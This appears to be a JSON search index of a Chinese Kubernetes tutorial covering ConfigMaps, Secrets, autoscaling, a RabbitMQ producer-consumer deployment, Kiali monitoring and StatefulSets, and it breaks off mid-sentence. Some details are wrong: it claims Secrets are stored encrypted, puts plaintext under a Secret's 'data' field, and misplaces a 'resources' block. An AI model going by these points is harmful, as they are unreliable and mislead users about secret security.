\u4e2d\u73af\u5883\u53d8\u91cf\u540d\u79f0\u5141\u8bb8\u7684\u5b57\u7b26\u8303\u56f4\u662f\u6709\u9650\u7684\u3002\u5982\u679c\u67d0\u4e9b\u53d8\u91cf\u540d\u79f0\u4e0d\u6ee1\u8db3\u8fd9\u4e9b\u89c4\u5219\uff0c\u5219\u5373\u4f7f Pod \u53ef\u4ee5\u88ab\u542f\u52a8\uff0c\u4f60\u7684\u5bb9\u5668\u4e5f\u65e0\u6cd5\u8bbf\u95ee\u8fd9\u4e9b\u73af\u5883\u53d8\u91cf\u3002","title":"\u5c06 ConfigMap \u4f5c\u4e3a\u73af\u5883\u53d8\u91cf"},{"location":"22/#secret","text":"\u5982\u679c\u4f60\u6709\u4e00\u4e9b\u654f\u611f\u4fe1\u606f\uff0c\u4f8b\u5982\u5bc6\u7801\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u4f7f\u7528 Secret \u6765\u5b58\u50a8\u8fd9\u4e9b\u4fe1\u606f\u3002Secret \u4e0e ConfigMap \u7c7b\u4f3c\uff0c\u4f46\u662f Secret \u4f1a\u88ab\u52a0\u5bc6\u5b58\u50a8\u3002 Secret \u4e5f\u6709 data \u5b57\u6bb5\uff0c\u4e0e ConfigMap \u884c\u4e3a\u57fa\u672c\u4e00\u81f4\u3002 apiVersion: v1 kind: Secret metadata: name: password-secret type: Opaque data: password: password \u8fd9\u91cc type \u5b57\u6bb5\u662f Opaque\uff0c\u5373\u7528\u6237\u81ea\u5b9a\u4e49\u52a0\u5bc6\u65b9\u5f0f\u3002type \u8fd8\u6709\u8bb8\u591a\u7c7b\u578b\uff0c\u6709\u4e0d\u540c\u7684\u52a0\u5bc6\u65b9\u5f0f\uff0c\u5177\u4f53\u53ef\u4ee5 \u67e5\u770b\u6587\u6863 \u3002 \u6ce8\u610f\uff0ck8s \u53ea\u662f\u5c06 Secret \u52a0\u5bc6\u5b58\u50a8\uff0c\u800c\u4e0d\u662f\u52a0\u5bc6\u4f20\u8f93\u3002\u5373\u8fd9\u91cc\u6211\u4eec\u7684\u6587\u4ef6\u91cc\u5199\u7684\u662f\u660e\u6587\u5bc6\u7801\uff0c\u4f46\u662f k8s \u4f1a\u5c06\u5176\u52a0\u5bc6\u5b58\u50a8\u3002\u5982\u679c\u4f60\u4e0d\u5e0c\u671b\u660e\u6587\u5bc6\u7801\u51fa\u73b0\u5728\u6587\u4ef6\u4e2d\uff0c\u624b\u52a8\u8fdb\u884c\u5bf9\u79f0\u6216\u975e\u5bf9\u79f0\u52a0\u5bc6\uff0c\u7136\u540e\u5c06\u52a0\u5bc6\u540e\u7684\u5bc6\u7801\u5b58\u50a8\u5728 Secret \u4e2d\uff0c\u516c\u94a5\u516c\u5f00\u5728 ConfigMap\uff0c\u79c1\u94a5\u88ab\u5bf9\u5e94\u7684 Pod \u6301\u6709\u3002 \u5982\u679c\u8981\u52a0\u8f7d Secret\uff0c\u628a\u4e0a\u6587\u4e2d ConfigMap \u7684\u5bf9\u8c61\u540d\u6539\u4e3a Secret \u5373\u53ef\uff0c\u4f8b\u5982\uff0c apiVersion: v1 kind: Pod metadata: name: secret-dotfiles-pod spec: volumes: - name: secret-volume secret: secretName: dotfile-secret containers: - name: dotfile-test-container image: registry.k8s.io/busybox command: - ls - \"-l\" - \"/etc/secret-volume\" volumeMounts: - name: secret-volume readOnly: true mountPath: \"/etc/secret-volume\" \u6ce8\u610f\uff0cSecret \u5bf9\u6240\u6709\u6302\u8f7d\u7684\u5bb9\u5668\u90fd\u662f\u660e\u6587\u7684\u3002\u5982\u679c\u9700\u8981\u66f4\u5b89\u5168\u7684\u65b9\u5f0f\uff0c\u53ef\u4ee5\u624b\u52a8\u5b9e\u73b0\u975e\u5bf9\u79f0\u52a0\u5bc6\uff0c\u5e76\u628a\u79c1\u94a5\u50a8\u5b58\u5728\u552f\u4e00\u5141\u8bb8\u8bbf\u95ee\u7684 Pod \u4e2d\u3002","title":"Secret"},{"location":"22/#horizontalpodautoscaler","text":"\u524d\u9762\u6211\u4eec\u5df2\u7ecf\u5b9e\u73b0\u4e86\u670d\u52a1\u7684\u90e8\u7f72\u3002\u4f46\u662f\uff0c\u4f7f\u7528 Deployment \u53ea\u80fd\u7ed9\u5b9a\u4e00\u4e2a Pod \u7684\u6570\u91cf\u3002\u4f46\u5728\u73b0\u5b9e\u4e2d\uff0c\u5927\u90e8\u5206\u670d\u52a1\u4e0b\uff0c\u6211\u4eec\u90fd\u5e0c\u671b\u80fd\u81ea\u52a8\u6269\u7f29\uff0c\u4ee5\u8282\u7701\u8ba1\u7b97\u8d44\u6e90\u3002\u4f8b\u5982\uff0c\u5728\u8d2d\u7269\u6de1\u5b63\uff0c\u6211\u4eec\u5e0c\u671b\u51cf\u5c11\u670d\u52a1\u5668\u6570\u91cf\u6765\u7f29\u51cf\u6210\u672c\uff0c\u800c\u5728\u8d2d\u7269\u65fa\u5b63\uff0c\u6211\u4eec\u5e0c\u671b\u589e\u52a0\u670d\u52a1\u5668\u6570\u91cf\u6765\u63d0\u9ad8\u6027\u80fd\u3002 \u5bb9\u5668\u7684\u6269\u7f29\u5bb9\u662f k8s \u7684\u6838\u5fc3\u529f\u80fd\u4e4b\u4e00\u3002\u6269\u5bb9\u6709\u4e24\u4e2a\u7ef4\u5ea6\uff0c\u4e00\u4e2a\u662f\u6c34\u5e73\u6269\u5bb9\uff0c\u5373\u589e\u52a0 Pod \u7684\u6570\u91cf\uff0c\u53e6\u4e00\u4e2a\u662f\u5782\u76f4\u6269\u5bb9\uff0c\u5373\u589e\u52a0 Pod \u7684\u8d44\u6e90\u3002 \u6269\u7f29\u662f\u5341\u5206\u590d\u6742\u7684\uff0c\u6211\u4eec\u53ea\u4ecb\u7ecd\u6700\u7b80\u5355\u7684\u81ea\u52a8\u6c34\u5e73\u6269\u5bb9\u3002HorizontalPodAutoscaler \u662f k8s \u7684\u6c34\u5e73\u6269\u5bb9\u5668\u3002\u5b83\u4f1a\u6839\u636e\u7528\u6237\u5b9a\u4e49\u7684 CPU \u4f7f\u7528\u7387\u548c\u5185\u5b58\u4f7f\u7528\u7387\uff0c\u81ea\u52a8\u8c03\u6574 Pod \u7684\u6570\u91cf\u3002 apiVersion: autoscaling/v2 kind: HorizontalPodAutoscaler metadata: name: producer-hpa spec: scaleTargetRef: apiVersion: apps/v1 kind: Deployment name: producer minReplicas: 1 maxReplicas: 10 metrics: - type: Resource resource: name: cpu target: type: Utilization averageUtilization: 50 \u8fd9\u91cc\u7684 minReplicas \u548c maxReplicas \u5206\u522b\u662f\u6700\u5c0f\u548c\u6700\u5927 Pod \u6570\u91cf\u3002 metrics \u662f\u6c34\u5e73\u6269\u5bb9\u7684\u6307\u6807\uff0c\u8fd9\u91cc\u4f7f\u7528\u4e86 CPU \u4f7f\u7528\u7387\u3002 averageUtilization \u662f CPU \u4f7f\u7528\u7387\u7684\u76ee\u6807\u503c\u3002 \u4e0a\u9762\u7684\u914d\u7f6e\u65b9\u5f0f\u4e0b\uff0c\u5982\u679c CPU \u7684\u5e73\u5747\u4f7f\u7528\u7387\u8d85\u8fc7 50%\uff0c\u90a3\u4e48\u5c31\u4f1a\u589e\u52a0 Pod \u7684\u6570\u91cf\u3002\u5982\u679c CPU \u7684\u5e73\u5747\u4f7f\u7528\u7387\u4f4e\u4e8e 50%\uff0c\u90a3\u4e48\u5c31\u4f1a\u51cf\u5c11 Pod \u7684\u6570\u91cf\u3002\u4f46\u662f\u65e0\u8bba\u5982\u4f55\uff0c\u6700\u591a\u53ea\u4f1a\u589e\u52a0\u5230 10 \u4e2a Pod\uff0c\u6700\u5c11\u53ea\u4f1a\u51cf\u5c11\u5230 1 \u4e2a Pod\u3002 \u6b64\u5916\uff0c\u5e38\u7528\u7684\u6307\u6807\u8fd8\u6709\u5185\u5b58\uff0c\u4f7f\u7528\uff0c metrics: - type: Resource resource: name: memory target: type: Utilization averageUtilization: 50 \u6ce8\u610f\uff0c\u8fd9\u91cc\u7684\u7b97\u6cd5\u662f\u6ed1\u52a8\u7a97\u53e3\u7b97\u6cd5\u3002\u5982\u679c\u8981\u914d\u7f6e\u7b97\u6cd5\u7684\u53c2\u6570\uff0c\u4f7f\u7528 behavior \u5b57\u6bb5\u3002 behavior: scaleDown: stabilizationWindowSeconds: 300 scaleUp: stabilizationWindowSeconds: 300 \u4e0a\u9762\u7684 behavior \u4e2d\uff0cscaleDown \u548c scaleUp \u5206\u522b\u662f\u7f29\u5bb9\u548c\u6269\u5bb9\u7684\u914d\u7f6e\u3002 stabilizationWindowSeconds \u662f\u7a33\u5b9a\u7a97\u53e3\u7684\u65f6\u95f4\uff0c\u5373\u4e0a\u6587\u5e73\u5747\u503c\u8ba1\u7b97\u7684\u65f6\u95f4\u7a97\u53e3\u3002\u5f53\u7136\uff0c\u8fd8\u6709\u66f4\u590d\u6742\u7684\u914d\u7f6e\uff0c\u8fd9\u91cc\u4e0d\u518d\u8d58\u8ff0\u3002","title":"HorizontalPodAutoscaler"},{"location":"22/#_4","text":"\u73b0\u5728\uff0c\u6211\u4eec\u91cd\u65b0\u90e8\u7f72\u6211\u4eec\u4e4b\u524d\u7684\u7b80\u5355\u9879\u76ee\u3002\u6709\u4e00\u4e2a producer \u670d\u52a1\uff0c\u4e00\u4e2a\u5185\u5bb9\u968f\u65f6\u53ef\u4ee5\u4e22\u5f03\u7684\u6d88\u606f\u961f\u5217\uff0c\u4e00\u4e2a consumer \u670d\u52a1\u3002\u6211\u4eec\u5e0c\u671b\u6240\u6709\u7684\u670d\u52a1\u90fd\u662f\u65e0\u72b6\u6001\u670d\u52a1\uff0c\u53ef\u4ee5\u968f\u65f6\u91cd\u542f\uff0c\u4e14\u80fd\u81ea\u52a8\u6269\u5bb9\u3002\u6b64\u5916\uff0c\u914d\u7f6e\u4fe1\u606f\u4f7f\u7528 ConfigMap \u5b58\u50a8\uff0c\u654f\u611f\u4fe1\u606f\u4f7f\u7528 Secret \u5b58\u50a8\uff0c\u8fd8\u8981\u652f\u6301\u81ea\u52a8\u6269\u5bb9\u3002 \u6b64\u5916\uff0c\u6211\u4eec\u4f7f\u7528 helm \u6765\u6253\u5305\uff0c\u5e76\u5b9e\u73b0\u6a21\u7248\u3002","title":"\u751f\u4ea7\u7ea7\u65e0\u72b6\u6001\u670d\u52a1\u90e8\u7f72"},{"location":"22/#_5","text":"\u6211\u4eec\u5e0c\u671b\u80fd\u4f7f\u7528 ConfigMap \u5b58\u50a8 RabbitMQ \u7684\u7528\u6237\u540d\u4ee5\u53ca\u961f\u5217\u540d\u79f0\u3002 apiVersion: v1 kind: ConfigMap metadata: name: rabbitmq-config data: username: guest queue: food \u7136\u540e\u8fd8\u6709\u4e00\u4e2a Secret\uff0c\u5b58\u50a8 RabbitMQ \u7684\u5bc6\u7801\u3002 apiVersion: v1 kind: Secret metadata: name: rabbitmq-secret type: Opaque data: password: password","title":"\u914d\u7f6e\u53c2\u6570"},{"location":"22/#_6","text":"\u6211\u4eec\u8981\u4fee\u6539\u4e00\u4e0b\u6211\u4eec\u7684 Producer \u4e0e Consumer \u7684\u8fde\u63a5\u90e8\u5206\uff0c import { Hono } from 'hono' import { connect } from 'amqplib' import { config } from 'dotenv' config() const mq = `amqp://${process.env.RABBITMQ_USERNAME}:${process.env.RABBITMQ_PASSWORD}@message-queue:5672` async function connectMq() { const connection = await connect(mq) const channel = await connection.createChannel() await channel.assertQueue(process.env.RABBITMQ_QUEUE) return channel } const channel = connectMq() \u7136\u540e\u4fee\u6539 deployment \u90e8\u5206\uff0c apiVersion: apps/v1 kind: Deployment metadata: name: producer spec: replicas: 1 selector: matchLabels: app: producer template: metadata: labels: app: producer spec: resources: requests: memory: \"64Mi\" cpu: \"100m\" limits: memory: \"128Mi\" cpu: \"100m\" containers: - name: producer image: producer env: - name: RABBITMQ_USERNAME valueFrom: configMapKeyRef: name: rabbitmq-config key: username - name: RABBITMQ_QUEUE valueFrom: configMapKeyRef: name: rabbitmq-config key: queue - name: RABBITMQ_PASSWORD valueFrom: secretKeyRef: name: rabbitmq-secret key: password Consumer \u90e8\u5206\u7c7b\u4f3c\u3002 \u6b64\u5916\uff0c\u5bf9\u4e8e RabbitMQ\uff0c\u6211\u4eec\u540c\u6837\u8fdb\u884c\u914d\u7f6e\uff0c apiVersion: apps/v1 kind: Deployment metadata: name: message-queue spec: replicas: 1 selector: matchLabels: app: message-queue template: metadata: labels: app: message-queue spec: resources: requests: memory: \"64Mi\" cpu: \"100m\" limits: memory: \"128Mi\" cpu: \"100m\" containers: - name: message-queue image: rabbitmq ports: - containerPort: 5672 env: - name: RABBITMQ_DEFAULT_USER valueFrom: configMapKeyRef: name: rabbitmq-config key: username - name: RABBITMQ_DEFAULT_PASS valueFrom: secretKeyRef: name: rabbitmq-secret key: password Service \u5bf9\u8c61\u4e0d\u53d8\u3002","title":"\u670d\u52a1\u90e8\u7f72"},{"location":"22/#_7","text":"\u6211\u4eec\u7ee7\u7eed\u4f7f\u7528\u4e4b\u524d\u7684\u7f51\u5173\u5373\u53ef\uff0c\u914d\u7f6e\u8fc7\u7a0b\u7701\u7565\u3002 \u4e0d\u8fc7\uff0c\u6211\u4eec\u524d\u9762\u6ca1\u6709\u4ecb\u7ecd\u5bf9\u8c03\u8bd5\u5f88\u91cd\u8981\u7684\u670d\u52a1\u94fe\u8def\u8ffd\u8e2a\u3002\u670d\u52a1\u94fe\u8def\u8ffd\u8e2a\u662f\u4e00\u79cd\u76d1\u63a7\u624b\u6bb5\uff0c\u7528\u4e8e\u76d1\u63a7\u670d\u52a1\u4e4b\u95f4\u7684\u8c03\u7528\u3002kiali \u662f Istio \u7684\u76d1\u63a7\u5de5\u5177\u3002 \u6211\u4eec\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u6dfb\u52a0 Istio\u3002 kubectl apply -f https://raw.githubusercontent.com/istio/istio/release-1.23/samples/addons/kiali.yaml \u6ce8\u610f\uff0c\u5c31\u50cf\u6211\u4eec\u4e4b\u524d\u5b66\u4e60 MicroMeter \u4e00\u6837\uff0ckiali \u53ea\u662f\u4e00\u4e2a dashboard\u3002\u5b83\u9700\u8981\u4ece Prometheus \u548c Grafana \u4e2d\u83b7\u53d6\u6570\u636e\u3002\u6211\u4eec\u9700\u8981\u5148\u5b89\u88c5 Prometheus \u548c Grafana\u3002 kubectl apply -f https://raw.githubusercontent.com/istio/istio/release-1.23/samples/addons/grafana.yaml \u4ee5\u53ca\uff0c kubectl apply -f https://raw.githubusercontent.com/istio/istio/release-1.23/samples/addons/prometheus.yaml \u6ce8\u610f\uff0c\u540e\u8005 prometheus \u7684\u9ed8\u8ba4\u914d\u7f6e\u9002\u5408\u5c0f\u96c6\u7fa4\u800c\u975e\u5927\u96c6\u7fa4\u3002\u5982\u679c\u96c6\u7fa4\u53d8\u5f97\u592a\u5927\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528 Service Mesh \u6765\u4e3a\u96c6\u7fa4\u63d0\u4f9b\u57fa\u7840\u8bbe\u65bd\uff0c\u6211\u4eec\u4f1a\u5728\u540e\u9762\u4ecb\u7ecd Service Mesh\u3002 \u73b0\u5728\uff0c\u4f7f\u7528\uff0c istioctl dashboard kiali \u6765\u6253\u5f00 kiali\u3002\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u670d\u52a1\u4e4b\u95f4\u7684\u8c03\u7528\u5173\u7cfb\uff0c\u8c03\u7528\u56fe\uff0c\u6d41\u91cf\u7b49\u3002 \u6ce8\u610f\uff0c\u5982\u679c\u6211\u4eec\u4f7f\u7528 helm\uff0c\u5e94\u8be5\u628a\u4e0a\u9762\u7684\u6587\u4ef6\u653e\u5165 template \u4e2d\uff0c\u7136\u540e\u4f7f\u7528 helm install \u6765\u5b89\u88c5\u3002 \u4e0d\u8fc7\uff0c\u6211\u4eec\u4f1a\u53d1\u73b0\u6d88\u606f\u961f\u5217\u7684\u6d41\u91cf\u6ca1\u6709\u663e\u793a\u51fa\u6765\u3002\u6211\u4eec\u9700\u8981\u7ed9 RabbitMQ \u6dfb\u52a0\u63d2\u4ef6\uff0c rabbitmq-plugins enable rabbitmq_prometheus \u8fd9\u9700\u8981\u6211\u4eec\u4f7f\u7528 dockerfile \u542f\u52a8 RabbitMQ \u65f6\u6dfb\u52a0\u63d2\u4ef6\u3002 FROM rabbitmq:4.0-rc-management RUN rabbitmq-plugins enable rabbitmq_prometheus \u7136\u540e\u4f7f\u7528\u8fd9\u4e2a dockerfile \u6765\u6784\u5efa\u955c\u50cf\u5373\u53ef\u3002\u91cd\u542f\u6d88\u606f\u961f\u5217\u540e\uff0c\u8bb0\u5f97\u91cd\u542f Consumer \u548c Producer\u3002","title":"\u6d41\u91cf\u76d1\u63a7"},{"location":"22/#_8","text":"\u6211\u4eec\u4f7f\u7528 HorizontalPodAutoscaler \u6765\u5b9e\u73b0\u81ea\u52a8\u6269\u5bb9\u3002 apiVersion: autoscaling/v2 kind: HorizontalPodAutoscaler metadata: name: producer-hpa spec: scaleTargetRef: apiVersion: apps/v1 kind: Deployment name: producer minReplicas: 1 maxReplicas: 10 metrics: - type: Resource resource: name: cpu target: type: Utilization averageUtilization: 50 consumer \u540c\u7406\u3002","title":"\u81ea\u52a8\u6269\u5bb9"},{"location":"23/","text":"\u5fae\u670d\u52a1\u901f\u6210 Ch23 k8s \u6709\u72b6\u6001\u670d\u52a1 \u524d\u9762\u6211\u4eec\u8bb2\u89e3\u4e86\u65e0\u72b6\u6001\u670d\u52a1\u7684\u90e8\u7f72\u3002\u4f46\u662f\uff0c\u73b0\u5b9e\u4e2d\u5927\u90e8\u5206\u7684\u670d\u52a1\u90fd\u662f\u6709\u72b6\u6001\u7684\uff0c\u4f8b\u5982\u6570\u636e\u5e93\uff0c\u9700\u8981\u6301\u4e45\u5316\u7684\u6d88\u606f\u961f\u5217\uff0c\u4ee5\u53ca\u9700\u8981\u6301\u4e45\u5316\u7684\u7f13\u5b58\u7b49\u7b49\u3002\u8fd9\u4e9b\u670d\u52a1\u7684\u90e8\u7f72\u548c\u7ba1\u7406\u90fd\u6709\u4e00\u4e9b\u7279\u6b8a\u7684\u8981\u6c42\u3002 \u5728 k8s \u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528\u6709\u72b6\u6001\u7ec4\u4ef6 StatefulSet \u6765\u90e8\u7f72\u6709\u72b6\u6001\u670d\u52a1\u3002StatefulSet \u4e0e Deployment \u7c7b\u4f3c\uff0c\u4f46\u662f\u6709\u4e00\u4e9b\u4e0d\u540c\u4e4b\u5904\u3002 \u4f46\u662f\uff0c\u5b9e\u9645\u4e0a\uff0c\u5728\u751f\u4ea7\u73af\u5883\u4e2d\u4e00\u822c\u4f1a\u628a\u6709\u72b6\u6001\u670d\u52a1\u90e8\u7f72\u5728\u4e13\u95e8\u7684\u6570\u636e\u5e93\u96c6\u7fa4\u4e2d\uff0c\u800c\u4e0d\u662f\u76f4\u63a5\u90e8\u7f72\u5728 k8s \u4e2d\u3002\u8fd9\u6837\u53ef\u4ee5\u66f4\u597d\u7684\u7ba1\u7406\u6570\u636e\u5e93\u7684\u5907\u4efd\uff0c\u6062\u590d\uff0c\u4ee5\u53ca\u6570\u636e\u7684\u6301\u4e45\u5316\u3002\u4e24\u79cd\u65b9\u6cd5\u5404\u6709\u4f18\u52a3\uff0c\u5177\u4f53\u60c5\u51b5\u5177\u4f53\u5206\u6790\uff0c\u6211\u4eec\u90fd\u4f1a\u8bb2\u89e3\u3002 \u6709\u72b6\u6001\u5bf9\u8c61 k8s \u4e2d\u6709\u72b6\u6001\u5bf9\u8c61\u4e3b\u8981\u6709\u4ee5\u4e0b\u51e0\u4e2a\u3002 StatefulSet StatefulSet \u662f\u6709\u72b6\u6001\u670d\u52a1\u7684\u90e8\u7f72\u5bf9\u8c61\u3002StatefulSet \u4e0e Deployment \u7c7b\u4f3c\uff0c\u4f46\u662f\u6709\u4e00\u4e9b\u4e0d\u540c\u4e4b\u5904\u3002 StatefulSet \u4f1a\u4e3a\u6bcf\u4e2a Pod \u5206\u914d\u4e00\u4e2a\u552f\u4e00\u7684\u6807\u8bc6\u7b26\uff0c\u8fd9\u4e2a\u6807\u8bc6\u7b26\u4f1a\u968f\u7740 Pod \u7684\u91cd\u542f\u800c\u4fdd\u6301\u4e0d\u53d8\u3002 StatefulSet \u4f1a\u6309\u7167\u987a\u5e8f\u542f\u52a8\u548c\u5173\u95ed Pod\uff0c\u8fd9\u6837\u53ef\u4ee5\u4fdd\u8bc1 Pod \u7684\u542f\u52a8\u548c\u5173\u95ed\u987a\u5e8f\u3002 \u8fd9\u4e24\u6761\u7279\u6027\uff0c\u4f7f\u5f97\u6bcf\u4e00\u4e2a Pod \u90fd\u6709\u4e00\u4e2a\u552f\u4e00\u7684\u6807\u8bc6\u7b26\uff0c\u53ef\u4ee5\u7528\u6765\u505a\u4e00\u4e9b\u7279\u6b8a\u7684\u64cd\u4f5c\uff0c\u4f8b\u5982\u6570\u636e\u8fc1\u79fb\uff0c\u6570\u636e\u5907\u4efd\u7b49\u7b49\uff0c\u56e0\u6b64\u53ef\u4ee5\u652f\u63f4\u6709\u72b6\u6001\u670d\u52a1\u7684\u90e8\u7f72\u3002 \u8981\u521b\u5efa\u4e00\u4e2a StatefulSet\uff0c\u901a\u5e38\u9700\u8981\u4e00\u4e2a Headless Service \u4f5c\u4e3a\u7f51\u7edc\u5165\u53e3\uff0c\u4ee5\u53ca\u4e00\u4e2a PersistentVolume \u4f5c\u4e3a\u6570\u636e\u6301\u4e45\u5316\uff0c\u5e76\u7ed9 Pod \u5e26\u4e0a\u5bf9\u5e94\u7684 PersistentVolumeClaim\u3002 PersistentVolume \u4e0e PersistentVolumeClaim \u524d\u9762\u6211\u4eec\u8bb2\u8fc7\uff0cStatefulSet \u81ea\u5df1\u672c\u8eab\u53ea\u662f\u7ed9\u6bcf\u4e2a Pod \u5206\u914d\u4e00\u4e2a\u552f\u4e00\u7684\u6807\u8bc6\u7b26\uff0c\u4f46\u662f\u5e76\u4e0d\u4f1a\u4fdd\u8bc1\u6570\u636e\u7684\u6301\u4e45\u5316\u3002\u6570\u636e\u7684\u6301\u4e45\u5316\u9700\u8981\u4f7f\u7528 PersistentVolume \u4e0e PersistentVolumeClaim\u3002 PersistentVolume \u662f\u4e00\u4e2a\u72ec\u7acb\u4e8e Pod \u7684\u5b58\u50a8\u5377\uff0c\u53ef\u4ee5\u7528\u6765\u5b58\u50a8\u6570\u636e\u3002PersistentVolumeClaim \u662f\u4e00\u4e2a\u58f0\u660e\uff0c\u7528\u6765\u8bf7\u6c42 PersistentVolume\u3002\u5982\u679c\u6bcf\u4e00\u4e2a Pod \u90fd\u6709\u552f\u4e00\u7684 PersistentVolumeClaim\uff0c\u90a3\u4e48\u6bcf\u4e00\u4e2a Pod \u90fd\u6709\u81ea\u5df1\u7684\u72ec\u7acb\u7684\u5b58\u50a8\u5377\u3002\u8fd9\u6837\uff0c\u5c31\u53ef\u4ee5\u4fdd\u8bc1\u6bcf\u4e00\u4e2a Pod \u7684\u6570\u636e\u662f\u72ec\u7acb\u7684\uff0c\u5b9e\u73b0\u4e86\u6709\u72b6\u6001\u670d\u52a1\u7684\u90e8\u7f72\u3002 \u4f8b\u5982\uff0c\u5982\u679c\u4e00\u4e2a\u96c6\u7fa4\u4e2d\u6709\u4e24\u4e2a\u6570\u636e\u5e93\uff0c\u800c\u6211\u4eec\u5e0c\u671b\u5411\u5916\u63d0\u4f9b\u4e00\u4e2a\u6570\u636e\u5e93\u96c6\u7fa4\u670d\u52a1\uff0c\u5e76\u4f7f\u7528\u5206\u7247\u6280\u672f\u589e\u52a0\u5e76\u53d1\u6570\uff08\u5206\u7247\u662f\u6307\u5c06\u6570\u636e\u5206\u6563\u5230\u591a\u4e2a\u6570\u636e\u5e93\u4e2d\uff0c\u7c7b\u4f3c\u4e8e\u78c1\u76d8\u9635\u5217\u7684 RAID 0\uff09\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 StatefulSet \u90e8\u7f72\u4e24\u4e2a\u6570\u636e\u5e93\uff0c\u6bcf\u4e00\u4e2a\u6570\u636e\u5e93\u90fd\u6709\u81ea\u5df1\u7684 PersistentVolumeClaim\uff0c\u7136\u540e\u4f7f\u7528\u4e00\u4e2a\u7f51\u5173\u5c06\u8bf7\u6c42\u5206\u53d1\u5230\u8fd9\u4e24\u4e2a\u6570\u636e\u5e93\u4e2d\u3002 \u4e3a\u4e86\u8fdb\u4e00\u6b65\u63d0\u9ad8\u5e76\u53d1\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u90e8\u7f72\u4e00\u4e2a Redis \u6765\u7f13\u5b58\u67d0\u6761\u6570\u636e\u5728\u54ea\u4e00\u4e2a\u6570\u636e\u5e93\u4e2d\u3002\u4f46\u662f\uff0c\u4e00\u65e6\u4efb\u4f55\u4e00\u4e2a\u6570\u636e\u5e93\u53d1\u751f\u6545\u969c\uff0c\u5982\u679c\u4f7f\u7528 Deployment \u6a21\u5f0f\uff0c\u5373\u4f7f\u4f7f\u7528\u4e86\u6b63\u786e\u7684\u6301\u4e45\u5316\u6280\u672f\uff0c\u91cd\u542f\u7684 Pod \u4e5f\u4f1a\u6709\u4e0d\u540c\u7684\u6807\u8bc6\u7b26\uff0c\u8fd9\u6837 Redis \u5c31\u4f1a\u5931\u6548\u3002\u56e0\u6b64\uff0c\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528 StatefulSet\uff0c\u6765\u786e\u4fdd\u6bcf\u4e2a Pod \u5728\u91cd\u542f\u524d\u540e\u6709\u76f8\u540c\u7684\u7f51\u7edc\u6807\u8bc6\u4e0e\u6570\u636e\u3002 \u6d88\u606f\u961f\u5217\u4e5f\u662f\u540c\u6837\u7684\u9053\u7406\uff0c\u4f8b\u5982\u5de5\u4f5c\u5728\u6247\u51fa\u6a21\u5f0f\u7684\u6d88\u606f\u961f\u5217\uff0c\u6bcf\u4e00\u4e2a Pod \u90fd\u6709\u81ea\u5df1\u7684\u961f\u5217\u3002\u6b64\u65f6\u9700\u8981\u4e00\u4e2a\u72ec\u7acb\u7684\u6301\u4e45\u5316\u5b58\u50a8\uff0c\u4ee5\u53ca\u4e00\u4e2a\u72ec\u7acb\u7684\u7f51\u7edc\u6807\u8bc6\uff0c\u6765\u4fdd\u8bc1\u91cd\u542f\u524d\u540e\u6570\u636e\u7684\u4e00\u81f4\u6027\u3002 Headless Service Headless \u662f\u4e00\u79cd\u7279\u6b8a\u7684 Service\u3002\u524d\u9762\u6211\u4eec\u8bb2\u8fc7\uff0cService \u6709\u56db\u79cd\u6a21\u5f0f\uff0c\u800c Headless Service \u662f\u4e00\u79cd\u7279\u6b8a\u7684 ClusterIP Service\uff0c\u5b83\u7684 ClusterIP \u662f None\u3002Headless Service \u4f1a\u4e3a\u6bcf\u4e00\u4e2a Pod \u5206\u914d\u4e00\u4e2a DNS \u8bb0\u5f55\uff0c\u8fd9\u6837\u53ef\u4ee5\u901a\u8fc7 DNS \u8bb0\u5f55\u8bbf\u95ee\u6bcf\u4e00\u4e2a Pod\u3002\u8fd9\u6837\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 DNS \u8bb0\u5f55\u8bbf\u95ee\u6bcf\u4e00\u4e2a Pod\uff0c\u800c\u4e0d\u9700\u8981\u901a\u8fc7 Service \u8bbf\u95ee\u3002 \u6709\u72b6\u6001\u670d\u52a1 k8s \u90e8\u7f72 \u8981\u5728 k8s \u96c6\u7fa4\u4e2d\u90e8\u7f72\u6709\u72b6\u6001\u670d\u52a1\uff0c\u8fd9\u91cc\u6211\u4eec\u7b80\u5355\u5730\u4f7f\u7528\u4e24\u4e2a nginx\uff0c\u5b83\u4eec\u63d0\u4f9b\u7684\u7f51\u9875\u5c06\u4f1a\u4e0d\u540c\u3002\u6211\u4eec\u5c06\u4f7f\u7528 StatefulSet \u6765\u90e8\u7f72\u8fd9\u4e24\u4e2a nginx\uff0c\u4ee5\u53ca\u4e00\u4e2a Headless Service \u6765\u8bbf\u95ee\u8fd9\u4e24\u4e2a nginx\u3002 \u521b\u5efa PersistentVolume \u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u521b\u5efa\u82e5\u5e72 PersistentVolume\u3002\u6211\u4eec\u53ea\u4f1a\u90e8\u7f72\u4e24\u4e2a PostgresQL\uff0c\u56e0\u6b64\u6211\u4eec\u53ea\u9700\u8981\u4e24\u4e2a PersistentVolume\u3002 \u6b64\u5916\uff0c\u524d\u9762\u6211\u4eec\u6ca1\u6709\u63d0\u8fc7\uff0c\u4e00\u4e2a\u6587\u4ef6\u4e2d\u53ef\u4ee5\u901a\u8fc7 --- \u5206\u9694\u7b26\u5206\u9694\u591a\u4e2a\u5bf9\u8c61\u3002 apiVersion: v1 kind: PersistentVolume metadata: name: html-pv-0 spec: storageClassName: html capacity: storage: 1Mi accessModes: - ReadWriteOnce hostPath: path: /mnt/data/html-0 --- apiVersion: v1 kind: PersistentVolume metadata: name: html-pv-1 spec: storageClassName: html capacity: storage: 1Mi accessModes: - ReadWriteOnce hostPath: path: /mnt/data/html-1 \u8fd9\u91cc\u7684 Capacity \u5373\u5bb9\u91cf\uff0c\u800c AccessModes \u662f\u8bbf\u95ee\u6a21\u5f0f\u3002\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 ReadWriteOnce\uff0c\u53c8\u79f0 RWO\uff0c\u5373\u53ef\u8bfb\u53ef\u5199\uff0c\u4f46\u53ea\u80fd\u88ab\u4e00\u4e2a Pod \u6302\u8f7d\u3002\u5176\u5b83\u6a21\u5f0f\u6709 